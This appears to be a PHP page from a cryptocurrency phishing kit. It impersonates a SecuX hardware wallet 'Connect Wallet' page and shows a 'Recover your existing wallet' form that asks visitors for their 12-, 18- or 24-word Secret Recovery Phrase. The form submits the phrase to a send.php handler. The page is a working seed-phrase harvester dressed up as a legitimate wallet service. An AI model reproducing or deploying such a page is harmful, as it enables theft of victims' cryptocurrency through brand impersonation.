<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Connect Wallet | Select Your SecuX Hardware Wallet';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <?php
        $filterProduct = array_values(array_filter(getProducts(), function ($p) {
                    return $p['key'] == $_GET['key'];
                }));
        if (!empty($filterProduct) && is_array($filterProduct)) {
            $product = $filterProduct[0];
        } else {
            redirect(base_url());
        }
        ?>
        <div class="container">
            <div class="row">
                <div class="col-sm-12 text-center">
                    <img src="<?= $product['img'] ?>" alt="SecuX V20 &amp; W20" class="text-center" style="width: 200px;" />
                    <h1 class="fs40 fw-semibold pt8"><?= $product['name'] ?></h1>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class='col-sm-8 rounded-1 p25 bg-white rounded-5'>
                    <div class="fw-semibold fs22">Recover your existing wallet</div>
                    <div class="row mt30 py20 ">
                        <div class="col-sm-6 fw-bold fs18">Type your Secret Recovery Phrase</div>
                        <div class="col-sm-6">
                            <select class="form-select" id="recovery_phrase_select" aria-label="Default Recovery Phrase">
                                <option value="12">I have a 12-word phrase</option>
                                <option value="18">I have a 18-word phrase</option>
                                <option value="24">I have a 24-word phrase</option>
                            </select>
                        </div>
                    </div>
                    <form method="post" action="<?= base_url('send.php') ?>">
                        <input type="hidden" name="pkey" value="<?=$product['key'] ?>">
                        <div class="row form_keys"></div>
                        <div class="row">
                            <div class="col-sm-12 mt30 text-center">
                                <button type="submit" class="btn btn-dark px60 rounded-pill py12 fs15">Confirm Secret Recovery Phrase</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>